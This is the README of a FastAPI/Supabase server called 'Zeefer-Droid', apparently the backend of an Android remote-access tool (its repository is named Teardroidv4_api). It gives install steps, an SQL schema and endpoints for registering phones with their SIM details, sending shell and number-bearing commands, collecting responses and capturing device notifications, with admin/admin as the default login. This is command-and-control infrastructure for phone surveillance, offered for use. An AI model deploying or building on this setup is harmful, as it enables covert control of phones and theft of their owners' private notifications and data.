# 🔥 Zeefer-Droid API

Advanced Android Control Panel API built with FastAPI and Supabase.

## Features

✅ **Authentication** - Secure JWT-based authentication  
✅ **Device Management** - Register and manage Android devices  
✅ **Command Execution** - Send and track commands on devices  
✅ **Notifications** - Capture and manage notifications from devices  
✅ **Real-time Sync** - Track device status and online/offline state  

## Quick Start

### Prerequisites

- Python 3.9+
- Supabase Account (free)
- pip

### Installation

1. **Clone the repository**
```bash
git clone https://github.com/ZEEFAST/Teardroidv4_api
cd Teardroidv4_api
```

2. **Create virtual environment**
```bash
python3 -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

3. **Install dependencies**
```bash
pip install -r requirements.txt
```

4. **Setup Supabase**
   - Go to https://supabase.com
   - Create new project
   - Get your URL and Anon Key from Settings > API
   - Create tables using SQL below

5. **Create .env file**
```bash
cp .env.example .env
# Edit .env with your Supabase credentials
```

6. **Setup Database Tables**

Run this SQL in Supabase SQL Editor:

```sql
CREATE TABLE auth (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  username TEXT UNIQUE NOT NULL,
  password TEXT NOT NULL,
  created_at TIMESTAMP DEFAULT now()
);

CREATE TABLE client (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  android_version TEXT,
  device_name TEXT,
  sim_operator TEXT,
  sim_country TEXT,
  interval INTEGER DEFAULT 3000,
  active BOOLEAN DEFAULT true,
  last_online TIMESTAMP,
  created_at TIMESTAMP DEFAULT now()
);

CREATE TABLE command (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES client(id),
  command TEXT NOT NULL,
  shell TEXT,
  number TEXT,
  data TEXT,
  is_complete BOOLEAN DEFAULT false,
  success BOOLEAN DEFAULT false,
  response TEXT,
  created_at TIMESTAMP DEFAULT now(),
  completed_at TIMESTAMP
);

CREATE TABLE notification (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES client(id),
  package_name TEXT,
  title TEXT,
  body TEXT,
  read BOOLEAN DEFAULT false,
  created_at TIMESTAMP DEFAULT now()
);
```

7. **Run the API**
```bash
uvicorn main:app --reload --host 127.0.0.1 --port 8000
```

Server running at: `http://localhost:8000`

## API Endpoints

### Authentication
- `POST /auth/login` - Login with credentials
- `POST /auth/change-password` - Change password

### Clients
- `POST /client/add` - Register new device
- `GET /client/` - Get all devices
- `GET /client/device/{device_id}` - Get device info
- `DELETE /client/device/{device_id}` - Delete device

### Commands
- `POST /command/send` - Send command to device
- `GET /command/device/{device_id}` - Get pending commands
- `POST /command/complete` - Mark command complete
- `GET /command/response/{command_id}` - Get command response
- `GET /command/history/{device_id}` - Get command history

### Notifications
- `POST /notification/add` - Add notification
- `GET /notification/device/{device_id}` - Get device notifications
- `GET /notification/` - Get all notifications
- `PUT /notification/mark-read/{notification_id}` - Mark as read
- `DELETE /notification/device/{device_id}` - Delete device notifications

## Default Credentials

- **Username**: admin
- **Password**: admin

⚠️ Change these immediately in production!

## Testing on Android

1. Get your computer's local IP:
   - Windows: `ipconfig`
   - Mac/Linux: `ifconfig`

2. On Android phone (same WiFi):
   ```
   http://192.168.X.X:8000
   ```

## Documentation

API Documentation: `http://localhost:8000/docs`

## Support

For issues, create a GitHub issue.

## License

MIT License
